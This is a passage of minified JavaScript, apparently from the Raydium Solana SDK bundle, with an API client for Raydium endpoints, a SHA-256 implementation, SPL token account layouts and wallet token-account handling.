      OWNER_STAKE_FARMS: "/position/stake/{owner}",
      OWNER_LOCK_POSITION: "/position/clmm-lock/{owner}",
      IDO_KEYS: "/ido/key/ids",
      SWAP_HOST: "https://transaction-v1.raydium.io",
      SWAP_COMPUTE: "/compute/",
      SWAP_TX: "/transaction/",
      MINT_PRICE: "/mint/price",
      MIGRATE_CONFIG: "/main/migrate-lp",
      PRIORITY_FEE: "/main/auto-fee",
      CPMM_LOCK: "https://dynamic-ipfs.raydium.io/lock/cpmm/position",
    };
  SA({}, $_);
  var tT = "ray_tab_hash",
    eT = "ray_req_hash",
    nT = () => {
      if (void 0 === typeof window) return "";
      let t = sessionStorage.getItem(tT);
      return t || ((t = `ray-${Date.now()}`), sessionStorage.setItem(tT, t)), t;
    },
    rT = async (t) => {
      var e = t,
        { logCount: n = 1e3, removeLastLog: r } = e,
        o = TA(e, ["logCount", "removeLastLog"]);
      if (void 0 === typeof window) return new Promise((t) => t());
      let i = JSON.parse(localStorage.getItem(eT) || "[]").slice(0, n - 1);
      r && i.pop(),
        new Blob([JSON.stringify(o.data)]).size > 1024 &&
          (o.data = JSON.stringify(o.data).substring(0, 200) + "..."),
        i.unshift(_A(SA({}, o), { time: Date.now(), session: nT() }));
      try {
        localStorage.setItem(eT, JSON.stringify(i));
      } catch {
        if (r) {
          let t = !1,
            e = JSON.stringify(o.data).substring(0, 100);
          for (i[0].data = e + (e.length > 100 ? "..." : ""); !t; ) {
            i.pop();
            let e = JSON.stringify(o.data).substring(0, 100);
            i[0].data = e + (e.length > 100 ? "..." : "");
            try {
              localStorage.setItem(eT, JSON.stringify(i)), (t = !0);
            } catch {
              t = !1;
            }
          }
          return new Promise((t) => t());
        }
        return rT(_A(SA({}, o), { logCount: n, removeLastLog: !0 }));
      }
    },
    oT = PA("Raydium_Api"),
    iT = new Map(),
    sT = class {
      constructor({
        cluster: t,
        timeout: e,
        logRequests: n,
        logCount: r,
        urlConfigs: o,
      }) {
        (this.cluster = t),
          (this.urlConfigs = o || {}),
          (this.logCount = r || 1e3),
          (this.api = tv.create({
            baseURL: this.urlConfigs.BASE_HOST || $_.BASE_HOST,
            timeout: e,
          })),
          this.api.interceptors.request.use(
            (t) => {
              let { method: e, baseURL: n, url: r } = t;
              return (
                oT.debug(`${null == e ? void 0 : e.toUpperCase()} ${n}${r}`), t
              );
            },
            (t) => (oT.error("Request failed"), Promise.reject(t))
          ),
          this.api.interceptors.response.use(
            (t) => {
              let { config: e, data: r, status: o } = t,
                { method: i, baseURL: s, url: a } = e;
              return (
                n &&
                  rT({
                    status: o,
                    url: `${s}${a}`,
                    params: e.params,
                    data: r,
                    logCount: this.logCount,
                  }),
                oT.debug(
                  `${null == i ? void 0 : i.toUpperCase()} ${s}${a}  ${o}`
                ),
                r
              );
            },
            (t) => {
              let { config: e, response: r = {} } = t,
                { status: o } = r,
                { method: i, baseURL: s, url: a } = e;
              return (
                n &&
                  rT({
                    status: o,
                    url: `${s}${a}`,
                    params: e.params,
                    data: t.message,
                    logCount: this.logCount,
                  }),
                oT.error(`${i.toUpperCase()} ${s}${a} ${o || t.message}`),
                Promise.reject(t)
              );
            }
          );
      }
      async getClmmConfigs() {
        return (
          await this.api.get(this.urlConfigs.CLMM_CONFIG || $_.CLMM_CONFIG)
        ).data;
      }
      async getCpmmConfigs() {
        return (
          await this.api.get(this.urlConfigs.CPMM_CONFIG || $_.CPMM_CONFIG)
        ).data;
      }
      async getClmmPoolLines(t) {
        return (
          await this.api.get(
            `${
              this.urlConfigs.POOL_LIQUIDITY_LINE || $_.POOL_LIQUIDITY_LINE
            }?pool_id=${t}`
          )
        ).data;
      }
      async getBlockSlotCountForSecond(t) {
        if (!t) return 2;
        let e = (
          await tv.post(t, {
            id: "getRecentPerformanceSamples",
            jsonrpc: "2.0",
            method: "getRecentPerformanceSamples",
            params: [4],
          })
        ).result.map((t) => t.numSlots);
        return e.reduce((t, e) => t + e, 0) / e.length / 60;
      }
      async getChainTimeOffset() {
        return (await this.api.get(this.urlConfigs.CHAIN_TIME || $_.CHAIN_TIME))
          .data;
      }
      async getRpcs() {
        return this.api.get(this.urlConfigs.RPCS || $_.RPCS);
      }
      async getTokenList() {
        return (await this.api.get(this.urlConfigs.TOKEN_LIST || $_.TOKEN_LIST))
          .data;
      }
      async getJupTokenList() {
        return (
          await this.api.get("", {
            baseURL: this.urlConfigs.JUP_TOKEN_LIST || $_.JUP_TOKEN_LIST,
          })
        ).map((t) =>
          _A(SA({}, t), {
            chainId: 101,
            programId: t.tags.includes("token-2022")
              ? Cc.toBase58()
              : Bc.toBase58(),
          })
        );
      }
      async getTokenInfo(t) {
        return (
          await this.api.get(
            (this.urlConfigs.MINT_INFO_ID || $_.MINT_INFO_ID) +
              `?mints=${t.map((t) => t.toString()).join(",")}`
          )
        ).data;
      }
      async getPoolList(t = {}) {
        let {
          type: e = "all",
          sort: n = "liquidity",
          order: r = "desc",
          page: o = 0,
          pageSize: i = 100,
        } = t;
        return (
          await this.api.get(
            (this.urlConfigs.POOL_LIST || $_.POOL_LIST) +
              `?poolType=${e}&poolSortField=${n}&sortType=${r}&page=${o}&pageSize=${i}`
          )
        ).data;
      }
      async fetchPoolById(t) {
        let { ids: e } = t;
        return (
          await this.api.get(
            (this.urlConfigs.POOL_SEARCH_BY_ID || $_.POOL_SEARCH_BY_ID) +
              `?ids=${e}`
          )
        ).data;
      }
      async fetchPoolKeysById(t) {
        let { idList: e } = t,
          n = [],
          r = e.filter((t) => !iT.has(t) || (n.push(iT.get(t)), !1)),
          o = [];
        return (
          r.length &&
            ((o = (
              await this.api.get(
                (this.urlConfigs.POOL_KEY_BY_ID || $_.POOL_KEY_BY_ID) +
                  `?ids=${r.join(",")}`
              )
            ).data.filter(Boolean)),
            o.forEach((t) => {
              iT.set(t.id, t);
            })),
          n.concat(o)
        );
      }
      async fetchPoolByMints(t) {
        let {
            mint1: e,
            mint2: n,
            type: r = "all",
            sort: o = "default",
            order: i = "desc",
            page: s = 1,
          } = t,
          [a, u] = [
            e && HI(e).toBase58(),
            n && "undefined" !== n ? HI(n).toBase58() : "",
          ],
          [c, l] = u && a > u ? [u, a] : [a, u];
        return (
          await this.api.get(
            (this.urlConfigs.POOL_SEARCH_MINT || $_.POOL_SEARCH_MINT) +
              `?mint1=${c}&mint2=${l}&poolType=${r}&poolSortField=${o}&sortType=${i}&pageSize=100&page=${s}`
          )
        ).data;
      }
      async fetchFarmInfoById(t) {
        let { ids: e } = t;
        return (
          await this.api.get(
            (this.urlConfigs.FARM_INFO || $_.FARM_INFO) + `?ids=${e}`
          )
        ).data;
      }
      async fetchFarmKeysById(t) {
        let { ids: e } = t;
        return (
          await this.api.get(
            (this.urlConfigs.FARM_KEYS || $_.FARM_KEYS) + `?ids=${e}`
          )
        ).data;
      }
      async fetchAvailabilityStatus() {
        return (
          await this.api.get(
            this.urlConfigs.CHECK_AVAILABILITY || $_.CHECK_AVAILABILITY
          )
        ).data;
      }
    },
    aT =
      "please provide owner in load() initialization or you can set by calling raydium.setOwner(owner)",
    uT = (...t) =>
      t
        .map((t) => {
          try {
            return "object" == typeof t ? JSON.stringify(t) : t;
          } catch {
            return t;
          }
        })
        .join(", "),
    cT = class {
      constructor({ scope: t, moduleName: e }) {
        (this.disabled = !1), (this.scope = t), (this.logger = PA(e));
      }
      createTxBuilder(t) {
        return (
          this.scope.checkOwner(),
          new X_({
            connection: this.scope.connection,
            feePayer: t || this.scope.ownerPubKey,
            cluster: this.scope.cluster,
            owner: this.scope.owner,
            blockhashCommitment: this.scope.blockhashCommitment,
            loopMultiTxStatus: this.scope.loopMultiTxStatus,
            api: this.scope.api,
            signAllTransactions: this.scope.signAllTransactions,
          })
        );
      }
      logDebug(...t) {
        this.logger.debug(uT(t));
      }
      logInfo(...t) {
        this.logger.info(uT(t));
      }
      logAndCreateError(...t) {
        let e = uT(t);
        throw new Error(e);
      }
      checkDisabled() {
        (this.disabled || !this.scope) &&
          this.logAndCreateError("module not working");
      }
    };
  function lT(t, ...e) {
    if (
      !(function (t) {
        return (
          t instanceof Uint8Array ||
          (null != t &&
            "object" == typeof t &&
            "Uint8Array" === t.constructor.name)
        );
      })(t)
    )
      throw new Error("Uint8Array expected");
    if (e.length > 0 && !e.includes(t.length))
      throw new Error(
        `Uint8Array expected of length ${e}, not of length=${t.length}`
      );
  }
  function dT(t, e = !0) {
    if (t.destroyed) throw new Error("Hash instance has been destroyed");
    if (e && t.finished)
      throw new Error("Hash#digest() has already been called");
  }
  var fT = (t) => new DataView(t.buffer, t.byteOffset, t.byteLength),
    hT = (t, e) => (t << (32 - e)) | (t >>> e);
  function pT(t) {
    return (
      "string" == typeof t &&
        (t = (function (t) {
          if ("string" != typeof t)
            throw new Error("utf8ToBytes expected string, got " + typeof t);
          return new Uint8Array(new TextEncoder().encode(t));
        })(t)),
      lT(t),
      t
    );
  }
  68 === new Uint8Array(new Uint32Array([287454020]).buffer)[0];
  var mT = class {
    clone() {
      return this._cloneInto();
    }
  };
  var gT = (t, e, n) => (t & e) ^ (~t & n),
    yT = (t, e, n) => (t & e) ^ (t & n) ^ (e & n),
    wT = class extends mT {
      constructor(t, e, n, r) {
        super(),
          (this.blockLen = t),
          (this.outputLen = e),
          (this.padOffset = n),
          (this.isLE = r),
          (this.finished = !1),
          (this.length = 0),
          (this.pos = 0),
          (this.destroyed = !1),
          (this.buffer = new Uint8Array(t)),
          (this.view = fT(this.buffer));
      }
      update(t) {
        dT(this);
        let { view: e, buffer: n, blockLen: r } = this,
          o = (t = pT(t)).length;
        for (let i = 0; i < o; ) {
          let s = Math.min(r - this.pos, o - i);
          if (s === r) {
            let e = fT(t);
            for (; r <= o - i; i += r) this.process(e, i);
            continue;
          }
          n.set(t.subarray(i, i + s), this.pos),
            (this.pos += s),
            (i += s),
            this.pos === r && (this.process(e, 0), (this.pos = 0));
        }
        return (this.length += t.length), this.roundClean(), this;
      }
      digestInto(t) {
        dT(this),
          (function (t, e) {
            lT(t);
            let n = e.outputLen;
            if (t.length < n)
              throw new Error(
                `digestInto() expects output buffer of length at least ${n}`
              );
          })(t, this),
          (this.finished = !0);
        let { buffer: e, view: n, blockLen: r, isLE: o } = this,
          { pos: i } = this;
        (e[i++] = 128),
          this.buffer.subarray(i).fill(0),
          this.padOffset > r - i && (this.process(n, 0), (i = 0));
        for (let l = i; l < r; l++) e[l] = 0;
        (function (t, e, n, r) {
          if ("function" == typeof t.setBigUint64)
            return t.setBigUint64(e, n, r);
          let o = BigInt(32),
            i = BigInt(4294967295),
            s = Number((n >> o) & i),
            a = Number(n & i),
            u = r ? 4 : 0,
            c = r ? 0 : 4;
          t.setUint32(e + u, s, r), t.setUint32(e + c, a, r);
        })(n, r - 8, BigInt(8 * this.length), o),
          this.process(n, 0);
        let s = fT(t),
          a = this.outputLen;
        if (a % 4)
          throw new Error("_sha2: outputLen should be aligned to 32bit");
        let u = a / 4,
          c = this.get();
        if (u > c.length) throw new Error("_sha2: outputLen bigger than state");
        for (let l = 0; l < u; l++) s.setUint32(4 * l, c[l], o);
      }
      digest() {
        let { buffer: t, outputLen: e } = this;
        this.digestInto(t);
        let n = t.slice(0, e);
        return this.destroy(), n;
      }
      _cloneInto(t) {
        t || (t = new this.constructor()), t.set(...this.get());
        let {
          blockLen: e,
          buffer: n,
          length: r,
          finished: o,
          destroyed: i,
          pos: s,
        } = this;
        return (
          (t.length = r),
          (t.pos = s),
          (t.finished = o),
          (t.destroyed = i),
          r % e && t.buffer.set(n),
          t
        );
      }
    },
    bT = new Uint32Array([
      1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993,
      2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987,
      1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774,
      264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986,
      2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711,
      113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291,
      1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411,
      3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344,
      430227734, 506948616, 659060556, 883997877, 958139571, 1322822218,
      1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424,
      2428436474, 2756734187, 3204031479, 3329325298,
    ]),
    vT = new Uint32Array([
      1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924,
      528734635, 1541459225,
    ]),
    AT = new Uint32Array(64),
    kT = class extends wT {
      constructor() {
        super(64, 32, 8, !1),
          (this.A = 0 | vT[0]),
          (this.B = 0 | vT[1]),
          (this.C = 0 | vT[2]),
          (this.D = 0 | vT[3]),
          (this.E = 0 | vT[4]),
          (this.F = 0 | vT[5]),
          (this.G = 0 | vT[6]),
          (this.H = 0 | vT[7]);
      }
      get() {
        let { A: t, B: e, C: n, D: r, E: o, F: i, G: s, H: a } = this;
        return [t, e, n, r, o, i, s, a];
      }
      set(t, e, n, r, o, i, s, a) {
        (this.A = 0 | t),
          (this.B = 0 | e),
          (this.C = 0 | n),
          (this.D = 0 | r),
          (this.E = 0 | o),
          (this.F = 0 | i),
          (this.G = 0 | s),
          (this.H = 0 | a);
      }
      process(t, e) {
        for (let l = 0; l < 16; l++, e += 4) AT[l] = t.getUint32(e, !1);
        for (let l = 16; l < 64; l++) {
          let t = AT[l - 15],
            e = AT[l - 2],
            n = hT(t, 7) ^ hT(t, 18) ^ (t >>> 3),
            r = hT(e, 17) ^ hT(e, 19) ^ (e >>> 10);
          AT[l] = (r + AT[l - 7] + n + AT[l - 16]) | 0;
        }
        let { A: n, B: r, C: o, D: i, E: s, F: a, G: u, H: c } = this;
        for (let l = 0; l < 64; l++) {
          let t =
              (c +
                (hT(s, 6) ^ hT(s, 11) ^ hT(s, 25)) +
                gT(s, a, u) +
                bT[l] +
                AT[l]) |
              0,
            e = ((hT(n, 2) ^ hT(n, 13) ^ hT(n, 22)) + yT(n, r, o)) | 0;
          (c = u),
            (u = a),
            (a = s),
            (s = (i + t) | 0),
            (i = o),
            (o = r),
            (r = n),
            (n = (t + e) | 0);
        }
        (n = (n + this.A) | 0),
          (r = (r + this.B) | 0),
          (o = (o + this.C) | 0),
          (i = (i + this.D) | 0),
          (s = (s + this.E) | 0),
          (a = (a + this.F) | 0),
          (u = (u + this.G) | 0),
          (c = (c + this.H) | 0),
          this.set(n, r, o, i, s, a, u, c);
      }
      roundClean() {
        AT.fill(0);
      }
      destroy() {
        this.set(0, 0, 0, 0, 0, 0, 0, 0), this.buffer.fill(0);
      }
    },
    IT = (function (t) {
      let e = (e) => t().update(pT(e)).digest(),
        n = t();
      return (
        (e.outputLen = n.outputLen),
        (e.blockLen = n.blockLen),
        (e.create = () => t()),
        e
      );
    })(() => new kT()),
    ST = Er.Layout,
    _T = Er.Structure,
    TT = Er.UInt,
    BT = Er.u8,
    CT = Er.u16,
    ET = Er.u32,
    xT = Er.nu64,
    PT = Er.s32,
    OT = Er.seq,
    RT = Er.blob,
    MT = Er.bits,
    LT = Er.offset,
    NT = class extends ST {
      constructor(t, e, n) {
        super(t, n), (this.blob = RT(t)), (this.signed = e);
      }
      decode(t, e = 0) {
        let n = new Yn(this.blob.decode(t, e), 10, "le");
        return this.signed ? n.fromTwos(8 * this.span).clone() : n;
      }
      encode(t, e, n = 0) {
        return (
          "number" == typeof t && (t = new Yn(t)),
          this.signed && (t = t.toTwos(8 * this.span)),
          this.blob.encode(t.toArrayLike(dt, "le", this.span), e, n)
        );
      }
    },
    DT = class extends ST {
      constructor(t) {
        super(8, t), (this._lower = MT(ET(), !1)), (this._upper = MT(ET(), !1));
      }
      addBoolean(t) {
        this._lower.fields.length < 32
          ? this._lower.addBoolean(t)
          : this._upper.addBoolean(t);
      }
      decode(t, e = 0) {
        let n = this._lower.decode(t, e),
          r = this._upper.decode(t, e + this._lower.span);
        return SA(SA({}, n), r);
      }
      encode(t, e, n = 0) {
        return (
          this._lower.encode(t, e, n) +
          this._upper.encode(t, e, n + this._lower.span)
        );
      }
    };
  function UT(t) {
    return new TT(1, t);
  }
  function qT(t) {
    return new TT(4, t);
  }
  function zT(t) {
    return new NT(8, !1, t);
  }
  function KT(t) {
    return new NT(16, !1, t);
  }
  function WT(t) {
    return new NT(8, !0, t);
  }
  var FT = class extends ST {
    constructor(t, e, n, r) {
      super(t.span, r),
        (this.layout = t),
        (this.decoder = e),
        (this.encoder = n);
    }
    decode(t, e) {
      return this.decoder(this.layout.decode(t, e));
    }
    encode(t, e, n) {
      return this.layout.encode(this.encoder(t), e, n);
    }
    getSpan(t, e) {
      return this.layout.getSpan(t, e);
    }
  };
  function jT(t) {
    return new FT(
      RT(32),
      (t) => new Ji(t),
      (t) => t.toBuffer(),
      t
    );
  }
  function GT(t) {
    return new FT(BT(), VT, HT, t);
  }
  function VT(t) {
    if (0 === t) return !1;
    if (1 === t) return !0;
    throw new Error("Invalid bool: " + t);
  }
  function HT(t) {
    return t ? 1 : 0;
  }
  function ZT(t) {
    return new FT(
      (function (t) {
        let e = ET("length"),
          n = JT([e, RT(LT(e, -e.span), "data")]);
        return new FT(
          n,
          ({ data: t }) => t,
          (t) => ({ data: t }),
          t
        );
      })(),
      (t) => t.toString("utf-8"),
      (t) => dt.from(t, "utf-8"),
      t
    );
  }
  var XT = class extends _T {
    decode(t, e) {
      return super.decode(t, e);
    }
  };
  function JT(t, e, n) {
    return new XT(t, e, n);
  }
  function YT(t, e, n) {
    let r,
      o =
        "number" == typeof e
          ? e
          : Jn.isBN(e)
          ? e.toNumber()
          : new Proxy(e, {
              get(t, e) {
                if (!r) {
                  let e = Reflect.get(t, "count");
                  (r = Jn.isBN(e) ? e.toNumber() : e),
                    Reflect.set(t, "count", r);
                }
                return Reflect.get(t, e);
              },
              set: (t, e, n) => (
                "count" === e && (r = n), Reflect.set(t, e, n)
              ),
            });
    return OT(t, o, n);
  }
  var QT = JT([
    jT("mint"),
    jT("owner"),
    zT("amount"),
    qT("delegateOption"),
    jT("delegate"),
    UT("state"),
    qT("isNativeOption"),
    zT("isNative"),
    zT("delegatedAmount"),
    qT("closeAuthorityOption"),
    jT("closeAuthority"),
  ]);
  function $T({ fromPublicKey: t, programId: e = Bc, assignSeed: n }) {
    let r = n
      ? btoa(n).slice(0, 32)
      : Xu.generate().publicKey.toBase58().slice(0, 32);
    return { publicKey: tB(t, r, e), seed: r };
  }
  function tB(t, e, n) {
    let r = dt.concat([t.toBuffer(), dt.from(e), n.toBuffer()]),
      o = IT(r);
    return new Ji(o);
  }
  function eB(t) {
    let { mint: e, tokenAccount: n, owner: r, programId: o = Bc } = t;
    return bl(n, e, r, o);
  }
  function nB(t) {
    let {
      tokenAccount: e,
      payer: n,
      multiSigners: r = [],
      owner: o,
      programId: i = Bc,
    } = t;
    return yl(e, n, o, r, i);
  }
  async function rB(t) {
    let {
        connection: e,
        amount: n,
        commitment: r,
        payer: o,
        owner: i,
        skipCloseAccount: s,
      } = t,
      a = await e.getMinimumBalanceForRentExemption(QT.span, r),
      u = II(n).add(new Yn(a)),
      c = $T({ fromPublicKey: o, programId: Bc });
    return {
      addresses: { newAccount: c.publicKey },
      signers: [],
      instructions: [
        Gs.createAccountWithSeed({
          fromPubkey: o,
          basePubkey: o,
          seed: c.seed,
          newAccountPubkey: c.publicKey,
          lamports: u.toNumber(),
          space: QT.span,
          programId: Bc,
        }),
        eB({
          mint: new Ji(MI.address),
          tokenAccount: c.publicKey,
          owner: i,
          programId: Bc,
        }),
      ],
      instructionTypes: [hS, pS],
      endInstructionTypes: s ? [] : [gS],
      endInstructions: s
        ? []
        : [nB({ tokenAccount: c.publicKey, payer: o, owner: i })],
    };
  }
  PA("Raydium_Util");
  var oB = class extends cT {
      constructor(t) {
        super(t),
          (this._tokenAccounts = []),
          (this._tokenAccountRawInfos = []),
          (this._accountListener = []),
          (this._clientOwnedToken = !1),
          (this._notSubscribeAccountChange = !1),
          (this._accountFetchTime = 0);
        let {
          tokenAccounts: e,
          tokenAccountRawInfos: n,
          notSubscribeAccountChange: r,
        } = t;
        (this._tokenAccounts = e || []),
          (this._tokenAccountRawInfos = n || []),
          (this._notSubscribeAccountChange = null == r || r),
          (this._clientOwnedToken = !(!e && !n));
      }
      get tokenAccounts() {
        return this._tokenAccounts;
      }
      get tokenAccountRawInfos() {
        return this._tokenAccountRawInfos;
      }
      set notSubscribeAccountChange(t) {
        this._notSubscribeAccountChange = t;
      }
      updateTokenAccount({ tokenAccounts: t, tokenAccountRawInfos: e }) {
        return (
          t && (this._tokenAccounts = t),
          e && (this._tokenAccountRawInfos = e),
          this._accountChangeListenerId &&
            this.scope.connection.removeAccountChangeListener(
              this._accountChangeListenerId
            ),
          (this._accountChangeListenerId = void 0),
          (this._clientOwnedToken = !0),
          this
        );
      }
      addAccountChangeListener(t) {
        return this._accountListener.push(t), this;
      }
      removeAccountChangeListener(t) {
        return (
          (this._accountListener = this._accountListener.filter(
            (e) => e !== t
          )),
          this
        );
      }
      getAssociatedTokenAccount(t, e) {
        return y_(this.scope.ownerPubKey, t, e).publicKey;
      }
      resetTokenAccounts() {
        this._clientOwnedToken ||
          ((this._tokenAccounts = []), (this._tokenAccountRawInfos = []));
      }
      async fetchWalletTokenAccounts(t) {
        if (
          this._clientOwnedToken ||
          ((null == t || !t.forceUpdate) &&
            this._tokenAccounts.length &&
            Date.now() - this._accountFetchTime <
              (this._notSubscribeAccountChange ? 5e3 : 18e4))
        )
          return {
            tokenAccounts: this._tokenAccounts,
            tokenAccountRawInfos: this._tokenAccountRawInfos,
          };
        this.scope.checkOwner();
        let e = SA(SA({}, {}), t),
          [n, r, o] = await Promise.all([
            this.scope.connection.getAccountInfo(
              this.scope.ownerPubKey,
              e.commitment
            ),
            this.scope.connection.getTokenAccountsByOwner(
              this.scope.ownerPubKey,
              { programId: Bc },
              e.commitment
            ),
            this.scope.connection.getTokenAccountsByOwner(
              this.scope.ownerPubKey,
              { programId: Cc },
              e.commitment
            ),
          ]),
          { tokenAccounts: i, tokenAccountRawInfos: s } = (function ({
            owner: t,
            solAccountResp: e,
            tokenAccountResp: n,
          }) {
            let r = [],
              o = [];
            for (let { pubkey: i, account: s } of n.value) {
              let e = QT.decode(s.data),
                { mint: n, amount: a } = e;
              r.push({
                publicKey: i,
                mint: n,
                amount: a,
                isAssociated: y_(t, n, s.owner).publicKey.equals(i),
                isNative: !1,
                programId: s.owner,
              }),
                o.push({ pubkey: i, accountInfo: e, programId: s.owner });
            }
            return (
              e &&
                r.push({
                  mint: Ji.default,
                  amount: new Yn(String(e.lamports)),
                  isNative: !0,
                  programId: e.owner,
                }),
              { tokenAccounts: r, tokenAccountRawInfos: o }
            );
          })({
            owner: this.scope.ownerPubKey,
            solAccountResp: n,
            tokenAccountResp: {
              context: r.context,
              value: [...r.value, ...o.value],
            },
          });
        return (
          (this._tokenAccounts = i),
          (this._tokenAccountRawInfos = s),
          (this._accountFetchTime = Date.now()),
          this._notSubscribeAccountChange ||
            (this._accountChangeListenerId &&
              this.scope.connection.removeAccountChangeListener(
                this._accountChangeListenerId
              ),
            (this._accountChangeListenerId =
              this.scope.connection.onAccountChange(
                this.scope.ownerPubKey,
                () => {
                  this.fetchWalletTokenAccounts({ forceUpdate: !0 }),
                    this._accountListener.forEach((t) =>
                      t({
                        tokenAccounts: this._tokenAccounts,
                        tokenAccountRawInfos: this._tokenAccountRawInfos,
                      })
                    );
                },
                { commitment: null == t ? void 0 : t.commitment }
              ))),
          { tokenAccounts: i, tokenAccountRawInfos: s }
        );
      }
      clearAccountChangeCkb() {
        void 0 !== this._accountChangeListenerId &&
          this.scope.connection.removeAccountChangeListener(
            this._accountChangeListenerId
          );
      }
      async getCreatedTokenAccount({
        mint: t,
        programId: e = Bc,
        associatedOnly: n = !0,
      }) {
        await this.fetchWalletTokenAccounts();
        let r = this._tokenAccounts
            .filter(({ mint: e }) => (null == e ? void 0 : e.equals(t)))
            .sort((t, e) => (t.amount.lt(e.amount) ? 1 : -1)),
          o = this.getAssociatedTokenAccount(t, e);
        for (let i of r) {
          let { publicKey: t } = i;
          if (t && (!n || (n && o.equals(t)))) return t;
        }
      }
      async getOrCreateTokenAccount(t) {
        var e, n, r, o;
        await this.fetchWalletTokenAccounts();
        let {
            mint: i,
            createInfo: s,
            associatedOnly: a,
            owner: u,
            notUseTokenAccount: c = !1,
            skipCloseAccount: l = !1,
            checkCreateATAOwner: d = !1,
            assignSeed: f,
          } = t,
          h = new Ji(t.tokenProgram || Bc),
          p = this.getAssociatedTokenAccount(i, new Ji(h)),
          m = (c ? [] : this.tokenAccountRawInfos)
            .filter(
              (t) => t.accountInfo.mint.equals(i) && (!a || t.pubkey.equals(p))
            )
            .sort((t, e) =>
              t.accountInfo.amount.lt(e.accountInfo.amount) ? 1 : -1
            );
        if (void 0 === s || m.length > 0)
          return m.length > 0 ? { account: m[0].pubkey } : {};
        let g = {
          instructions: [],
          endInstructions: [],
          signers: [],
          instructionTypes: [],
          endInstructionTypes: [],
        };
        if (a) {
          let t = vl(u, p, u, i, h),
            r = this.tokenAccountRawInfos.find((t) => t.pubkey.equals(p));
          if (d) {
            let n = await this.scope.connection.getAccountInfo(p);
            if (null === n)
              null == (e = g.instructions) || e.push(t),
                g.instructionTypes.push(mS);
            else if (
              !(
                n.owner.equals(h) &&
                $c.decode(n.data).mint.equals(i) &&
                $c.decode(n.data).owner.equals(u)
              )
            )
              throw Error(
                `create ata check error -> mint: ${i.toString()}, ata: ${p.toString()}`
              );
          } else
            void 0 === r &&
              (g.instructions.push(t), g.instructionTypes.push(mS));
          if (i.equals(GI) && s.amount) {
            let t = await rB({
              connection: this.scope.connection,
              owner: this.scope.ownerPubKey,
              payer: s.payer || this.scope.ownerPubKey,
              amount: null != (n = s.amount) ? n : 0,
              skipCloseAccount: l,
            });
            g.instructions.push(...(t.instructions || [])),
              g.endInstructions.push(...(t.endInstructions || [])),
              g.instructionTypes.push(...(t.instructionTypes || [])),
              g.endInstructionTypes.push(...(t.endInstructionTypes || [])),
              s.amount &&
                (g.instructions.push(
                  (function ({
                    source: t,
                    destination: e,
                    owner: n,
                    amount: r,
                    multiSigners: o = [],
                    tokenProgram: i = Bc,
                  }) {
                    return _l(t, e, n, BigInt(String(r)), o, i);
                  })({
                    source: t.addresses.newAccount,
                    destination: p,
                    owner: this.scope.ownerPubKey,
                    amount: s.amount,
                    tokenProgram: Bc,
                  })
                ),
                g.instructionTypes.push(yS));
          }
          return (
            !l &&
              void 0 === r &&
              (g.endInstructions.push(
                nB({
                  owner: u,
                  payer: s.payer || u,
                  tokenAccount: p,
                  programId: h,
                })
              ),
              g.endInstructionTypes.push(gS)),
            { account: p, instructionParams: g }
          );
        }
        {
          let t = $T({ fromPublicKey: u, programId: h, assignSeed: f }),
            e = await this.scope.connection.getMinimumBalanceForRentExemption(
              $c.span
            ),
            n = Gs.createAccountWithSeed({
              fromPubkey: u,
              basePubkey: u,
              seed: t.seed,
              newAccountPubkey: t.publicKey,
              lamports:
                e +
                Number(
                  null != (o = null == (r = s.amount) ? void 0 : r.toString())
                    ? o
                    : 0
                ),
              space: $c.span,
              programId: h,
            });
          return (
            g.instructions.push(
              n,
              eB({
                mint: i,
                tokenAccount: t.publicKey,
                owner: this.scope.ownerPubKey,
                programId: h,
              })
            ),
            g.instructionTypes.push(hS),
            g.instructionTypes.push(pS),
            l ||
              (g.endInstructions.push(
                nB({
                  owner: u,
                  payer: s.payer || u,
                  tokenAccount: t.publicKey,
                  programId: h,
                })
              ),
              g.endInstructionTypes.push(gS)),
            { account: t.publicKey, instructionParams: g }
          );
        }
      }
      async checkOrCreateAta({
        mint: t,
        programId: e = Bc,
        autoUnwrapWSOLToSOL: n,
      }) {
        var r;
        await this.fetchWalletTokenAccounts();
        let o =
            null ==
            (r = this.scope.account.tokenAccounts.find(
              ({ mint: e }) =>
                (null == e ? void 0 : e.toBase58()) === t.toBase58()
            ))
              ? void 0
              : r.publicKey,
          i = this.scope.ownerPubKey,
          s = {};
        if (!o) {
          let n = this.getAssociatedTokenAccount(t, e),
            r = await vl(i, n, i, t, e);
          (s.instructions = [r]), (s.instructionTypes = [mS]), (o = n);
        }
        return (
          n &&
            GI.toBase58() === t.toBase58() &&
            ((s.endInstructions = [
              nB({ owner: i, payer: i, tokenAccount: o, programId: e }),
            ]),
            (s.endInstructionTypes = [gS])),
          { pubKey: o, newInstructions: s }
        );
      }
      async handleTokenAccount(t) {
        let {
            side: e,
            amount: n,
            mint: r,
            programId: o = Bc,
            tokenAccount: i,
            payer: s = this.scope.ownerPubKey,
            bypassAssociatedCheck: a,
            skipCloseAccount: u,
            checkCreateATAOwner: c,
          } = t,
          l = this.getAssociatedTokenAccount(r, o);
        if (new Ji(GI).equals(r)) {
          let t = await rB({
            connection: this.scope.connection,
            owner: this.scope.ownerPubKey,
            payer: s,
            amount: n,
            skipCloseAccount: u,
          });
          return SA({ tokenAccount: t.addresses.newAccount }, t);
        }
        if (!i || ("out" === e && !l.equals(i) && !a)) {
          let t = [],
            e = vl(this.scope.ownerPubKey, l, this.scope.ownerPubKey, r, o);
          if (c) {
            let n = await this.scope.connection.getAccountInfo(l);
            if (null === n) t.push(e);
            else if (
              !(
                n.owner.equals(Bc) &&
                $c.decode(n.data).mint.equals(r) &&
                $c.decode(n.data).owner.equals(this.scope.ownerPubKey)
              )
            )
              throw Error(
                `create ata check error -> mint: ${r.toString()}, ata: ${l.toString()}`
              );
          } else t.push(e);
          return { tokenAccount: l, instructions: t, instructionTypes: [mS] };
        }
        return { tokenAccount: i };
      }
      async processTokenAccount(t) {
        let e,
          {
            mint: n,
            programId: r = Bc,
            amount: o,
            useSOLBalance: i,
            handleTokenAccount: s,
